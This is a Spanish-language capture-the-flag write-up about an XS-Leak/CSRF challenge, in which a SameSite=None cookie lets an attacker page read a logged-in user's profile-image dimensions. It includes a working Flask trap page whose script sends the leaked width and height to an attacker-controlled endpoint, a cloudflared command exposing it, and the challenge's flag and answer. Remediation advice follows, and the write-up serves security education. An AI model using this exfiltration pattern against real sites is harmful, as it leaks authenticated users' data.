# Imagen Importante — Writeup (CSRF / Cross-Site Leak)

- **Plataforma:** SoftwareSeguro (HackLab 2025)
- **ID Desafío:** 40
- **Categoría:** CSRF (Cross-Site Request Forgery / Cross-Site Image Leaks)
- **Autor / Colaborador:** `adonaissh`
- **Flag:** `3c306e399cc344151642ef530c9de8d8`
- **Vulnerabilidades:** CWE-352 (Cross-Site Request Forgery), CWE-200 (Exposure of Sensitive Information via Side-Channel)

---

## 1. Descripción del Desafío

El sitio "Imagen Importante" es un blog donde el nivel de privilegios de cada
usuario está determinado por el tamaño, en píxeles, de su imagen de perfil
(`ancho × alto`). Por ejemplo, una imagen de 350×400 px equivale a un nivel de
140.000.

El objetivo es averiguar el nivel del usuario **Pepe**, sin tener acceso a su
cuenta, y calcular el hash MD5 de ese número.

La plataforma ofrece un mecanismo de interacción controlado (bot simulado): se le
puede indicar a un bot (que actúa como Pepe, ya autenticado en el sitio) que
abra dos pestañas simultáneas: una con el dominio del propio desafío, y otra con
**cualquier sitio arbitrario provisto por el evaluador**. Esa segunda pestaña constituye el vector
de entrada para el ataque.

- **Credenciales iniciales de exploración:** `hacklab` / `hacklab2025`.

---

## 2. Análisis e Identificación de la Vulnerabilidad

### Paso 1: Inspección de la Cookie de Sesión
Al autenticarse con las credenciales de prueba e inspeccionar el tráfico en Burp Suite:

```http
Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ.asZcdg.XtrCt1zPOXh_O2kGj0NRmxVSIr0; Secure; HttpOnly; Path=/; SameSite=None
```

El atributo crítico es **`SameSite=None`**.  
Por defecto, las especificaciones modernas de los navegadores aplican `SameSite=Lax`, impidiendo que las cookies de sesión se adjunten en peticiones entre orígenes cruzados (*cross-site*). Declarar `SameSite=None` **anula esta protección de origen**: el navegador adjunta automáticamente la cookie de sesión en cualquier solicitud dirigida al dominio del desafío desde un sitio externo bajo HTTPS.

### Paso 2: Análisis del Endpoint de Imagen de Perfil
En el código fuente HTML se observa:

```html
<img src="/profile-pic" alt="@hacklab" class="rounded-circle"
     style="width: 500px; height: 500px; object-fit: cover;">
```

- `/profile-pic` resuelve la imagen en función de la cookie de sesión activa.
- Las dimensiones en pantalla (500×500) son fijadas vía CSS, pero el nivel de privilegios depende de las dimensiones **reales / intrínsecas** del archivo binario.

### Paso 3: Cross-Site Leak vía `<img>` Side-Channel
Bajo políticas estrictas de CORS (*Cross-Origin Resource Sharing*), un script en un origen A no puede leer el cuerpo de una respuesta obtenida de un origen B mediante `fetch()`.  
Sin embargo, los navegadores permiten cargar recursos multimedia cross-origin mediante etiquetas `<img>` y exponen de forma legítima sus propiedades naturales:
- `img.naturalWidth`
- `img.naturalHeight`

**Cadena de explotación:**
1. Al forzar que el bot de Pepe cargue un sitio externo controlado por el atacante, este sitio crea dinámicamente un `<img src="https://<dominio-desafio>/profile-pic">`.
2. Como la sesión tiene `SameSite=None`, el navegador envía la cookie de Pepe y descarga su imagen de perfil real.
3. El evento `onload` en JavaScript lee `naturalWidth` y `naturalHeight` y los exfiltra a un servidor bajo control del atacante.

---

## 3. Preparación del Entorno y Servidor de Exfiltración

### Servidor Local en Python (Flask)
```python
from flask import Flask, request
import datetime

app = Flask(__name__)

PAGINA_TRAMPA = """
<!doctype html>
<html>
<head><title>Sitio de prueba</title></head>
<body>
<h1>Cargando...</h1>
<script>
  const img = new Image();
  img.onload = function() {
    const w = img.naturalWidth;
    const h = img.naturalHeight;
    fetch('/leak?w=' + w + '&h=' + h);
  };
  img.onerror = function() {
    fetch('/leak?error=1');
  };
  img.src = 'https://chl-473ef10a-fd3c-41b8-8ae3-0113db53d665-imagen-importante.softwareseguro.com.ar/profile-pic';
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return PAGINA_TRAMPA

@app.route("/leak")
def leak():
    w = request.args.get("w")
    h = request.args.get("h")
    error = request.args.get("error")
    timestamp = datetime.datetime.now().isoformat()
    if error:
        print(f"[{timestamp}] ERROR cargando imagen ({request.remote_addr})")
    else:
        nivel = int(w) * int(h)
        print(f"[{timestamp}] LEAK recibido -> width={w} height={h} NIVEL={nivel} (de {request.remote_addr})")
    return "", 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

### Exposición Pública con Cloudflare Tunnel
Para que el bot de la plataforma acceda al listener local sin páginas intermedias de advertencia (como ocurre con la capa gratuita de ngrok):

```bash
cloudflared tunnel --url http://localhost:5000
```
Obteniendo la URL pública:
```text
https://skins-undergraduate-constraints-accurate.trycloudflare.com
```

---

## 4. Explotación y Obtención de Datos

En el panel del reto se envió la URL pública para la simulación de la víctima:
- **Dominio del desafío:** `https://chl-473ef10a-fd3c-41b8-8ae3-0113db53d665-imagen-importante.softwareseguro.com.ar`
- **Sitio del atacante:** `https://skins-undergraduate-constraints-accurate.trycloudflare.com`

Al dispararse la visita simulada, el listener Flask registró la exfiltración:

```text
[LEAK recibido] -> width=2180 height=2280 NIVEL=4970400
```

---

## 5. Cálculo de la Flag

- **Cálculo del nivel:** $2180 \times 2280 = 4.970.400$
- **Generación del hash MD5:**

```bash
echo -n "4970400" | md5sum
```

```text
3c306e399cc344151642ef530c9de8d8
```

- **Flag:** `3c306e399cc344151642ef530c9de8d8`

---

## 6. Causa Raíz

1. **Configuración Insegura de Cookies (`SameSite=None`):** Remueve la protección predeterminada del navegador contra ataques CSRF sin una justificación de arquitectura.
2. **Ausencia de Validación de Origen:** El endpoint `/profile-pic` no valida cabeceras de origen (`Origin`, `Sec-Fetch-Site`, `Referer`) ni requiere tokens anti-CSRF.
3. **Fuga de Información por Canales Laterales (XS-Leaks):** La lógica de negocio depende de metadatos (dimensiones en píxeles) legibles directamente a través del DOM en etiquetas `<img>`.

---

## 7. Remediación Defensiva (OWASP)

1. **Configuración Restrictiva de `SameSite`:** Asignar `SameSite=Lax` o `SameSite=Strict` a las cookies de sesión para impedir que viajen en solicitudes originadas desde sitios externos.
2. **Defensas Anti-CSRF:** Implementar tokens anti-CSRF aleatorios y sincronizados (*Synchronizer Token Pattern*) o tokens en cabeceras personalizadas.
3. **Validación de Metadata `Sec-Fetch-Site`:** Rechazar solicitudes de recursos sensibles cuyo `Sec-Fetch-Site` sea `cross-site`.
4. **Desacoplar Metadatos de Lógica de Privilegios:** La asignación de roles o privilegios debe residir estrictamente en la base de datos de usuarios y nunca derivarse de características del archivo de imagen.

---

## 8. Herramientas Utilizadas

- **Flask (Python 3):** Servidor HTTP liviano para renderizar el payload y recibir el callback.
- **Cloudflare Tunnel (`cloudflared`):** Exposición de túnel HTTPS directo sin páginas interstitial.
- **Burp Suite:** Inspección de atributos de cookies HTTP.
- **`md5sum`:** Cálculo del hash final requerido por la plataforma.
